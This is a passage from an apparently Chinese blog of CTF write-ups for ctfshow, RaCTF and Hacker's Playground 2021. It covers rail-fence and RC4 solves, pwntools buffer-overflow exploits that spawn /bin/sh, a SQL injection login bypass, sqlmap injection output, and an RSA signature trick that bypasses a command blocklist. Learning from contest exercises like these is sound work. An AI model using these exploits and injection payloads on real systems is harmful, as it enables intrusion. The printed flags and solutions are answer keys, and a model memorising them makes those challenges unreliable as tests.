class="token punctuation">:</span>                step2<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'failed'</span><span class="token punctuation">)</span>            <span class="token comment"># time.sleep(100000)</span>            <span class="token keyword">continue</span><span class="token triple-quoted-string string">"""b'You choose the part_flag!\n'b'ctfshow&#123;White_give_ timehahaha&#125;\n'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本写得像狗屎一样。</p><h3 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h3><p>binwalk分离出题目，解压出来的文本是一张二维码，内容为</p><pre class="line-numbers language-none"><code class="language-none">cfhwc19abika_etso&#123;h_u_e_ui1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815133721249.png" alt></p><p>栅栏密码=&gt;</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;ch1_9ua_bei_kuai_1e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="RaCTF"><a href="#RaCTF" class="headerlink" title="RaCTF"></a>RaCTF</h1><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h3><p>签到</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">ractf&#123;so_here_we_are_again&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815200151479.png" alt></p><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="I’m-a-Shouty-Man"><a href="#I’m-a-Shouty-Man" class="headerlink" title="I’m a Shouty Man"></a>I’m a Shouty Man</h3><pre class="line-numbers language-none"><code class="language-none">You have intercepted an shouty man&#39;s secret message. find the flag!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Hacker’s-Playground-2021"><a href="#Hacker’s-Playground-2021" class="headerlink" title="Hacker’s Playground 2021"></a>Hacker’s Playground 2021</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816193908038.png" alt></p><h3 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h3><pre class="line-numbers language-none"><code class="language-none">Did you enjoy Hacker&#39;s Playground 2021?To make a better event, please participate in the survey below.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调查问卷</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SCTF&#123;7h4nk_yOu_533_y0u_4941n_1n_S5TF2O22!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210818002752794.png" alt></p><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BOF-101"><a href="#BOF-101" class="headerlink" title="BOF 101"></a>BOF 101</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816194223883.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816194536967.png" alt></p><p>看看它的数据栈的结构</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816210215266.png" alt></p><p>直接写脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'bof101.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x555555555229</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>chall<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># SCTF&#123;n0w_U_R_B0F_3xpEr7&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>0xdeadbeef</code>覆盖的地址是8bytes，还要再加上4bytes才能溢出返回地址。</p><h3 id="BOF-102"><a href="#BOF-102" class="headerlink" title="BOF 102"></a>BOF 102</h3><p>刚开始没有看到它提供了下载链接，哎我的锅，</p><p><code>nc bof102.sstf.site 1337</code></p><p>直接给出了c源码，这也太明目张胆了，直接变白盒Pwn</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bofme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name > "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s.\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you wanna build a snowman?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" > "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"!!!%s!!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'Welcome to BOF 102!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bofme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是还是要看system函数的地址，我又打开了ida。。。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816222930056.png" alt></p><p>写利用脚本。这里没有设置专门的开<code>/bin/sh</code>的system函数，所以这里不仅要设置system函数的地址，还要设置system函数的参数，也就是<code>/bin/sh</code>，并且最终决定将这个参数设置在下图中圈1的位置，圈2的位置是溢出处。然后将system的参数设置为name变量的起始位置<code>0x0804a034</code>即可</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816225058216.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'bof102.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>sysargs <span class="token operator">=</span> <span class="token string">b'/bin/sh'</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080483E0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a034</span><span class="token punctuation">)</span>  <span class="token comment"># 32位程序的返回地址是4bytes。</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>sysargs<span class="token punctuation">)</span>chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>chall<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""cat flagSCTF&#123;B0F_A774ck_w1Th_arg5_1n_x86&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SQLi-101"><a href="#SQLi-101" class="headerlink" title="SQLi 101"></a>SQLi 101</h3><p>简单的sql注入，还带提示，直接payload<code>admin&#39; || &#39;1&#39;=&#39;1#</code>拿下</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210816234526222.png" alt></p><h3 id="SQLi-102"><a href="#SQLi-102" class="headerlink" title="SQLi 102"></a>SQLi 102</h3><p>联合查询注入，懒得手测，直接sqlmap</p><pre class="line-numbers language-none"><code class="language-none">$ sqlmap -u &#39;http:&#x2F;&#x2F;sqli102.sstf.site&#x2F;step3.php?searchkey&#x3D;1&#39; --batch -D sqli102 -T findme -columns        ___       __H__ ___ ___[)]_____ ___ ___  &#123;1.5.5#stable&#125;|_ -| . [,]     | .&#39;| . ||___|_  [.]_|_|_|__,|  _|      |_|V...       |_|   http:&#x2F;&#x2F;sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 00:35:02 &#x2F;2021-08-17&#x2F;[00:35:02] [INFO] resuming back-end DBMS &#39;mysql&#39; [00:35:02] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: searchkey (GET)    Type: time-based blind    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)    Payload: searchkey&#x3D;1&#39; AND (SELECT 6169 FROM (SELECT(SLEEP(5)))mjsW) AND &#39;TYuL&#39;&#x3D;&#39;TYuL    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: searchkey&#x3D;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x7178717171,0x614d795469735164567877744b556652536d5a5651444451616c427864456f62704474446b455464,0x71766b7671),NULL,NULL,NULL,NULL,NULL-- ----[00:35:02] [INFO] the back-end DBMS is MySQLweb application technology: PHP 7.3.3, Nginx 1.21.1back-end DBMS: MySQL &gt;&#x3D; 5.0.12[00:35:02] [INFO] fetching columns for table &#39;findme&#39; in database &#39;sqli102&#39;Database: sqli102Table: findme[4 columns]+----------+------------+| Column   | Type       |+----------+------------+| 1lls&#125;    | varchar(4) || SCTF&#123;    | int(10)    || b451c_SQ | varchar(4) || Li_5k    | varchar(4) |+----------+------------+[00:35:03] [INFO] fetched data logged to text files under &#39;&#x2F;home&#x2F;m4xlmum&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;sqli102.sstf.site&#39;[*] ending @ 00:35:03 &#x2F;2021-08-17&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SCTF&#123;b451c_SQLi_5k1lls&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RC-four"><a href="#RC-four" class="headerlink" title="RC four"></a>RC four</h3><p>这个没怎么看过，直接看看他解释的，好像就是一个简单的和keystream的异或。所以先将明文与密文异或获得keysteam，再将keystream与flag的密文异或获得flag。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210817194600281.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>c1 <span class="token operator">=</span> <span class="token number">0x634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8</span>c2 <span class="token operator">=</span> <span class="token number">0x624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb</span>m1 <span class="token operator">=</span> <span class="token string">b"RC4 is a Stream Cipher, which is very simple and fast."</span>c1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span>l <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token punctuation">(</span>cc1<span class="token punctuation">,</span> cc2<span class="token punctuation">,</span> mm1<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>c1<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> c2<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> m1<span class="token punctuation">[</span><span class="token punctuation">:</span>l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    keystream <span class="token operator">=</span> cc1 <span class="token operator">^</span> mm1    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>cc2 <span class="token operator">^</span> keystream<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># SCTF&#123;B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RSA-101"><a href="#RSA-101" class="headerlink" title="RSA 101"></a>RSA 101</h3><pre class="line-numbers language-none"><code class="language-none">Did you learn exponentiation in the middle school?RSA doesn&#39;t ask for more than that.The server is running at: nc rsa101.sstf.site 1104.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码如下所示，只涉及一个简单的解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getStrongPrime<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> os <span class="token keyword">import</span> systemp <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">65537</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[RSA parameters]"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>s <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>s<span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nWelcome to command signer/executor."</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Menu : 1. Verify and run the signed command"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       2. Generate a signed command"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       3. Base64 encoder"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"       4. Exit"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>welcome<span class="token punctuation">(</span><span class="token punctuation">)</span>sel <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">" > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> sel <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>sgn <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Signed command: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>sgn <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>sgn<span class="token punctuation">)</span>cmd <span class="token operator">=</span> verify<span class="token punctuation">(</span>sgn<span class="token punctuation">)</span>commands <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"ls -l"</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">,</span> <span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"cat flag"</span><span class="token punctuation">]</span><span class="token keyword">if</span> cmd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> commands<span class="token punctuation">:</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Possible commands: "</span><span class="token punctuation">,</span> commands<span class="token punctuation">)</span><span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Base64 encoded command to sign: "</span><span class="token punctuation">)</span>cmd <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">b"cat flag"</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's forbidden."</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signed command:"</span><span class="token punctuation">,</span> b64encode<span class="token punctuation">(</span>sign<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"3"</span><span class="token punctuation">:</span>cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"String to encode: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64 encoded string:"</span><span class="token punctuation">,</span> b64encode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sel <span class="token operator">==</span> <span class="token string">"4"</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye."</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid selection."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个原理就是将明文分解，利用mod运算的性质，直接获得m</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210818002342952.png" alt></p><p>其中<code>m = m1 * m2</code>，因为这里只需绕过黑名单<code>cat flag</code>即可，所以操作也不难。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">import</span> FactorDB<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token punctuation">,</span> b64encode<span class="token keyword">def</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">b' > Base64 encoded command to sign: Signed command: '</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>                c <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> c            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'rsa101.sstf.site'</span><span class="token punctuation">,</span> <span class="token number">1104</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">0</span>e <span class="token operator">=</span> <span class="token number">0x10001</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>task <span class="token operator">=</span> FactorDB<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>m1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>m2 <span class="token operator">=</span> <span class="token 